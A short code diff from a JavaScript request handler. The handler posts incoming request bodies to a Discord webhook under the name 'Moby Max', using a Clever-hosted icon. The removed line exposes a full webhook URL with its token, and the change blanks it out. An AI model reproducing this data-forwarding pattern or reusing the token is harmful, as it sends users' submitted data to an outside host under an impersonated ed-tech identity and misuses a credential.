@@ -10,7 +10,7 @@ function (request, response) {
         request.on('data', function (data) {
             body += data;
             const request22 = new XMLHttpRequest();
-            request22.open("POST", "https://discord.com/api/webhooks/1100904906329706567/MQtMew3fdEZ7UliX7V5_kjSEnys8fOtL7rKvvlOdLvQ-QsgYOVF2iIV3tkcKV4CUMFL5")
+            request22.open("POST", "")
             const message = {
               username: "Moby Max",
               avatar_url: "https://assets.clever.com/resource-icons/apps/560c49e73489f6010000577a/icon_20c694e.png",
